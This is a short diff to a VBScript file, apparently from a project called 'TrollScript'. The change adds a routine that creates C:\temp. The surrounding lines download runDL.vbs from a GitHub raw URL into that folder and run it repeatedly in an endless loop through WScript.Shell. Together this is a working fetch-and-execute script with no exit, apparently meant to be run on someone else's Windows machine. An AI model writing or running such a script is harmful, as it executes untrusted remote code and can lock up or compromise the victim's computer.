@@ -19,6 +19,15 @@ Sub HTTPDownload( myURL, myPath )
     Next
     objFile.Close( )
 End Sub
+Function createFolder()
+ Set fso=createobject("Scripting.FileSystemObject")
+    Foldername="C:\temp"
+ If fso.FolderExists(Foldername) = false Then
+  fso.CreateFolder (Foldername)
+ End If
+ Set fso=nothing
+End Function
+createFolder
 HTTPDownload "https://raw.githubusercontent.com/CortezJEL/TrollScript/main/runDL.vbs", "c:\temp\runDL.vbs"
 Do Until false 
 CreateObject("WScript.Shell").Run "c:\temp\runDL.vbs"
